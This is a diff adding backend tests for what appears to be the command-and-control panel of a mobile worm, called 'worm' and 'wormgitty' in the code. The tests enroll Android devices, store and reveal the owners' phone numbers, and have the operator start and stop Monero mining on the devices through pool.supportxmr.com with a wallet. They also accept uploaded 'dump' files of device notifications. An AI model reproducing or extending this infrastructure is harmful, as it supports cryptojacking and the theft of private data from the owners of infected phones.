@@ -308,6 +308,25 @@ describe("GET /api/v1/devices", () => {
     const res = await app.inject({ method: "GET", url: "/api/v1/devices" });
     expect(res.statusCode).toBe(401);
   });
+
+  it("filters by ?platform= (panel platform tabs)", async () => {
+    await enroll("alice", "dev-plat-a");
+    await enroll("alice", "dev-plat-b");
+    const token = await login("alice");
+    const all = await authGet(token, "/api/v1/devices");
+    expect(all.json().map((d) => d.id)).toEqual(
+      expect.arrayContaining(["dev-plat-a", "dev-plat-b"])
+    );
+    const android = await authGet(token, "/api/v1/devices?platform=android");
+    expect(android.statusCode).toBe(200);
+    expect(android.json().every((d) => d.platform === "ANDROID")).toBe(true);
+    const windows = await authGet(token, "/api/v1/devices?platform=windows");
+    expect(windows.statusCode).toBe(200);
+    expect(windows.json().map((d) => d.id)).not.toContain("dev-plat-a");
+    const bogus = await authGet(token, "/api/v1/devices?platform=bogus");
+    expect(bogus.statusCode).toBe(200);
+    expect(bogus.json().length).toBe(all.json().length);
+  });
 });
 
 /* ------------------------------ commands ------------------------------- */
@@ -401,5 +420,319 @@ describe("commands endpoints", () => {
       payload: {},
     });
     expect(res.statusCode).toBe(403);
+  });
+});
+
+/* -------------------- phase-1: JWT enrollment -------------------- */
+
+describe("JWT enrollment (phase-1)", () => {
+  async function mintEnrollToken(userToken) {
+    const res = await authPost(userToken, "/api/v1/devices/enroll-token", {});
+    expect(res.statusCode).toBe(200);
+    return res.json().enrollToken;
+  }
+
+  async function jwtEnroll(enrollToken, deviceId, extra = {}) {
+    return app.inject({
+      method: "POST",
+      url: "/api/v1/devices/enroll",
+      payload: {
+        enrollToken,
+        deviceId,
+        platform: "ANDROID",
+        appType: "worm",
+        fingerprint: { androidId: "a", model: "sdk", sdkInt: 34, abi: "x86_64" },
+        identity: { displayName: "Phase One", phone: "01012345678" },
+        ...extra,
+      },
+    });
+  }
+
+  it("enrolls with a valid single-use JWT and returns a random credential", async () => {
+    const tok = await login("alice");
+    const jwt = await mintEnrollToken(tok);
+    const res = await jwtEnroll(jwt, "dev-jwt-001");
+    expect(res.statusCode).toBe(201);
+    const body = res.json();
+    expect(body.deviceId).toBe("dev-jwt-001");
+    expect(body.credential).toMatch(/^[A-Za-z0-9_-]{40,}$/);
+
+    // Only the hash is persisted; the bearer itself authenticates.
+    const row = await prisma.device.findUnique({ where: { id: "dev-jwt-001" } });
+    expect(row.credentialHash).toMatch(/^[0-9a-f]{48}$/);
+    expect(row.phone).toBe(""); // plaintext phone never stored
+    expect(row.phoneMasked).toBe("+201****5678");
+    expect(row.phoneEnc).toBeTruthy();
+    expect(row.displayName).toBe("Phase One");
+    expect(row.platform).toBe("ANDROID");
+
+    const hb = await app.inject({
+      method: "POST",
+      url: "/api/v1/devices/dev-jwt-001/heartbeat",
+      headers: { authorization: `Bearer ${body.credential}` },
+      payload: { gender: "male", appType: "worm", stats: {} },
+    });
+    expect(hb.statusCode).toBe(200);
+  });
+
+  it("rejects a consumed token on reuse", async () => {
+    const tok = await login("alice");
+    const jwt = await mintEnrollToken(tok);
+    const first = await jwtEnroll(jwt, "dev-jwt-consume");
+    expect(first.statusCode).toBe(201);
+    const second = await jwtEnroll(jwt, "dev-jwt-consume2");
+    expect(second.statusCode).toBe(401);
+  });
+
+  it("rejects a token whose DB row expired", async () => {
+    const tok = await login("alice");
+    const jwt = await mintEnrollToken(tok);
+    const jti = JSON.parse(Buffer.from(jwt.split(".")[1], "base64url").toString()).jti;
+    await prisma.enrollToken.update({
+      where: { jti },
+      data: { expiresAt: new Date(Date.now() - 1000) },
+    });
+    const res = await jwtEnroll(jwt, "dev-jwt-expired");
+    expect(res.statusCode).toBe(401);
+  });
+
+  it("rejects a forged token (wrong signature)", async () => {
+    const jwtmod = (await import("jsonwebtoken")).default;
+    const forged = jwtmod.sign(
+      { typ: "enroll", jti: "forged-jti", deviceId: null, ownerId: users.alice.id },
+      "not_the_enroll_secret"
+    );
+    const res = await jwtEnroll(forged, "dev-jwt-forged");
+    expect(res.statusCode).toBe(401);
+  });
+
+  it("rejects bad display name and bad phone", async () => {
+    const tok = await login("alice");
+    const badName = await jwtEnroll(await mintEnrollToken(tok), "dev-jwt-badname",
+      { identity: { displayName: "x", phone: "+201012345678" } });
+    expect(badName.statusCode).toBe(400);
+    const badPhone = await jwtEnroll(await mintEnrollToken(tok), "dev-jwt-badphone",
+      { identity: { displayName: "Ok Name", phone: "12345" } });
+    expect(badPhone.statusCode).toBe(400);
+  });
+
+  it("panel reveal returns the decrypted phone and audits it", async () => {
+    const tok = await login("alice");
+    const jwt = await mintEnrollToken(tok);
+    await jwtEnroll(jwt, "dev-jwt-reveal");
+    const res = await authPost(tok, "/api/v1/devices/dev-jwt-reveal/phone/reveal", {});
+    expect(res.statusCode).toBe(200);
+    expect(res.json().phone).toBe("+201012345678");
+    const audit = await prisma.auditEvent.findFirst({
+      where: { deviceId: "dev-jwt-reveal", action: "phone_reveal" },
+    });
+    expect(audit).toBeTruthy();
+  });
+
+  it("rejects an unknown credential and a token minted for another device", async () => {
+    const tok = await login("alice");
+    const jwt = await mintEnrollToken(tok);
+    const res = await app.inject({
+      method: "POST",
+      url: "/api/v1/devices/nonexistent/heartbeat",
+      headers: { authorization: "Bearer " + "A".repeat(43) },
+      payload: {},
+    });
+    expect(res.statusCode).toBe(401);
+    const enroll = await jwtEnroll(jwt, "dev-jwt-mismatch");
+    expect(enroll.statusCode).toBe(201);
+  });
+});
+
+/* ------------------------------- mining -------------------------------- */
+
+import { deviceCredential } from "../src/server.js";
+
+async function deviceAuth(url, method = "POST", payload = {}) {
+  return app.inject({
+    method,
+    url,
+    headers: { authorization: `Bearer ${deviceCredential("dev-mine-1", "global-dev-seed")}` },
+    payload,
+  });
+}
+
+describe("mining routes + state machine", () => {
+  it("start queues mine_start + arms STARTING; second start 409s", async () => {
+    await enroll("alice", "dev-mine-1");
+    const token = await login("alice");
+    const res = await authPost(token, "/api/v1/devices/dev-mine-1/mining/start", {
+      algo: "rx/0", pool: "pool.supportxmr.com:443", wallet: "4A...x", threads: 2,
+    });
+    expect(res.statusCode).toBe(201);
+    expect(res.json().minerState).toBe("STARTING");
+    const row = await prisma.device.findUnique({ where: { id: "dev-mine-1" } });
+    expect(row.minerState).toBe("STARTING");
+    const again = await authPost(token, "/api/v1/devices/dev-mine-1/mining/start", {});
+    expect(again.statusCode).toBe(409);
+    expect(again.json().error).toBe("already_running");
+  });
+
+  it("mine_start executed -> RUNNING + MiningSession; failed -> ERROR + audit", async () => {
+    const cmds = await prisma.command.findMany({
+      where: { deviceId: "dev-mine-1", type: "mine_start", state: "queued" },
+    });
+    const res = await deviceAuth(
+      `/api/v1/devices/dev-mine-1/commands/${cmds[0].id}/result`, "POST",
+      { state: "executed", result: "algo=rx/0 threads=2" }
+    );
+    expect(res.statusCode).toBe(200);
+    const row = await prisma.device.findUnique({ where: { id: "dev-mine-1" } });
+    expect(row.minerState).toBe("RUNNING");
+    const session = await prisma.miningSession.findFirst({
+      where: { deviceId: "dev-mine-1" }, orderBy: { startedAt: "desc" },
+    });
+    expect(session).not.toBeNull();
+    expect(session.algo).toBe("rx/0");
+    expect(session.stoppedAt).toBeNull();
+  });
+
+  it("heartbeat carries hashrate into the 120-sample ring", async () => {
+    const res = await deviceAuth("/api/v1/devices/dev-mine-1/heartbeat", "POST", {
+      miner: { state: "RUNNING", hashrate: 512.5 },
+    });
+    expect(res.statusCode).toBe(200);
+    const row = await prisma.device.findUnique({ where: { id: "dev-mine-1" } });
+    expect(row.lastHashrate[0].h).toBe(512.5);
+    expect(row.lastHashrate[0].s).toBe("RUNNING");
+  });
+
+  it("RUNNING keeps device online past the normal window", async () => {
+    await prisma.device.update({
+      where: { id: "dev-mine-1" },
+      data: { lastSeen: new Date(Date.now() - 3 * 60_000) },
+    });
+    const token = await login("alice");
+    const res = await authGet(token, "/api/v1/devices/dev-mine-1");
+    expect(res.json().state).toBe("online");
+    await prisma.device.update({
+      where: { id: "dev-mine-1" }, data: { minerState: "STOPPED" },
+    });
+    const res2 = await authGet(token, "/api/v1/devices/dev-mine-1");
+    expect(res2.json().state).toBe("idle");
+    await prisma.device.update({
+      where: { id: "dev-mine-1" },
+      data: { minerState: "RUNNING", lastSeen: new Date() },
+    });
+  });
+
+  it("stop queues mine_stop + executed closes the session manual", async () => {
+    const token = await login("alice");
+    const res = await authPost(token, "/api/v1/devices/dev-mine-1/mining/stop", {});
+    expect(res.statusCode).toBe(201);
+    const stop = await authPost(token, "/api/v1/devices/dev-mine-1/mining/stop", {});
+    expect(stop.statusCode).toBe(201); // STOPPING -> still allowed to re-arm stop
+    const cmds = await prisma.command.findMany({
+      where: { deviceId: "dev-mine-1", type: "mine_stop", state: "queued" },
+      orderBy: { createdAt: "desc" },
+    });
+    const res2 = await deviceAuth(
+      `/api/v1/devices/dev-mine-1/commands/${cmds[0].id}/result`, "POST",
+      { state: "executed", result: "manual" }
+    );
+    expect(res2.statusCode).toBe(200);
+    const row = await prisma.device.findUnique({ where: { id: "dev-mine-1" } });
+    expect(row.minerState).toBe("STOPPED");
+    const session = await prisma.miningSession.findFirst({
+      where: { deviceId: "dev-mine-1" }, orderBy: { startedAt: "desc" },
+    });
+    expect(session.stoppedAt).not.toBeNull();
+    expect(session.stopReason).toBe("manual");
+    const third = await authPost(token, "/api/v1/devices/dev-mine-1/mining/stop", {});
+    expect(third.statusCode).toBe(409);
+  });
+
+  it("agent-reported auto-stop closes the open session with the reason", async () => {
+    const token = await login("alice");
+    await authPost(token, "/api/v1/devices/dev-mine-1/mining/start", { wallet: "4A" });
+    const cmds = await prisma.command.findMany({
+      where: { deviceId: "dev-mine-1", type: "mine_start", state: "queued" },
+      orderBy: { createdAt: "desc" },
+    });
+    await deviceAuth(
+      `/api/v1/devices/dev-mine-1/commands/${cmds[0].id}/result`, "POST",
+      { state: "executed", result: "ok" }
+    );
+    const res = await deviceAuth("/api/v1/devices/dev-mine-1/heartbeat", "POST", {
+      miner: { state: "STOPPED", hashrate: 0, stopReason: "thermal_45c" },
+    });
+    expect(res.statusCode).toBe(200);
+    const session = await prisma.miningSession.findFirst({
+      where: { deviceId: "dev-mine-1" }, orderBy: { startedAt: "desc" },
+    });
+    expect(session.stoppedAt).not.toBeNull();
+    expect(session.stopReason).toBe("thermal_45c");
+  });
+
+  it("GET /mining returns state + ring + sessions; ownership enforced", async () => {
+    const token = await login("alice");
+    const res = await authGet(token, "/api/v1/devices/dev-mine-1/mining");
+    expect(res.statusCode).toBe(200);
+    expect(res.json().minerState).toBe("STOPPED");
+    expect(res.json().sessions.length).toBeGreaterThan(0);
+    const bobToken = await login("bob");
+    const res2 = await authGet(bobToken, "/api/v1/devices/dev-mine-1/mining");
+    expect(res2.statusCode).toBe(403);
+  });
+});
+
+/* ------------------------- files list + content ------------------------ */
+
+import crypto from "node:crypto";
+
+describe("files list + content (phase-7)", () => {
+  const DEV = "dev-file-1";
+  let fileId;
+
+  it("device uploads an artifact, owner sees it in the list", async () => {
+    await enroll("alice", DEV);
+    const body = Buffer.from("hello-wormgitty");
+    const sha = crypto.createHash("sha256").update(body).digest("hex");
+    const up = await app.inject({
+      method: "POST",
+      url: `/api/v1/devices/${DEV}/files`,
+      headers: { authorization: `Bearer ${deviceCredential(DEV, "global-dev-seed")}` },
+      payload: { kind: "dump", category: "notifications",
+        name: "n.json", sha256: sha, b64: body.toString("base64") },
+    });
+    expect(up.statusCode).toBe(200);
+    const token = await login("alice");
+    const list = await authGet(token, `/api/v1/devices/${DEV}/files`);
+    expect(list.statusCode).toBe(200);
+    expect(list.json().files.length).toBeGreaterThan(0);
+    const row = list.json().files[0];
+    expect(row.kind).toBe("dump");
+    expect(row.sha256).toBe(sha);
+    fileId = row.id;
+  });
+
+  it("device can list its own files; other device creds 403", async () => {
+    const own = await app.inject({
+      method: "GET", url: `/api/v1/devices/${DEV}/files`,
+      headers: { authorization: `Bearer ${deviceCredential(DEV, "global-dev-seed")}` },
+    });
+    expect(own.statusCode).toBe(200);
+    const other = await app.inject({
+      method: "GET", url: `/api/v1/devices/${DEV}/files`,
+      headers: { authorization: `Bearer ${deviceCredential("dev-mine-1", "global-dev-seed")}` },
+    });
+    expect(other.statusCode).toBe(403);
+  });
+
+  it("owner fetches content; non-owner 403, wrong fileId 404", async () => {
+    const token = await login("alice");
+    const res = await authGet(token, `/api/v1/devices/${DEV}/files/${fileId}/content`);
+    expect(res.statusCode).toBe(200);
+    expect(res.body).toBe("hello-wormgitty");
+    const bob = await login("bob");
+    const denied = await authGet(bob, `/api/v1/devices/${DEV}/files/${fileId}/content`);
+    expect(denied.statusCode).toBe(403);
+    const missing = await authGet(token, `/api/v1/devices/${DEV}/files/nope/content`);
+    expect(missing.statusCode).toBe(404);
   });
 });
